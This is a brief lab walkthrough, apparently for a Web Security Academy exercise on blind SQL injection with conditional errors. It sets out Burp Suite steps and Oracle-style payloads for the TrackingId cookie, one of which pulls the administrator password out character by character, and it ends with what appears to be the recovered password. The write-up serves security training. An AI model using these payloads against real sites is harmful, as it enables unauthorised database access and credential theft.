
## Blind SQL injection with conditional errors

1. main url : product category==>

https://0a8800d103869ee68003081a00f8006e.web-security-academy.net/filter?category=Pets

2. 2. go firefox  which is connected to burp suite and and open the burp suite than go the proxy ,trun on intercept and intercept the request and select the request with tracking id and send it to repeater and then send the request to the server

TrackingId=wNmyvxvGJPPxQc0r;

3. 3. now modify the request in repeater and add the following payload to the tracking id parameter to check if the query is true or false:

TrackingId=wNmyvxvGJPPxQc0r' And (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a;
>> this  input it evaluates to 1/0, which causes a divide-by-zero error. show an error message in the response. if this query is true then the server will respond with 'Internal Server Error'  message and if it is false then the server will not show the 'Internal Server Error' message.

AND (SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

4zmm3ekkzkkud28u47pb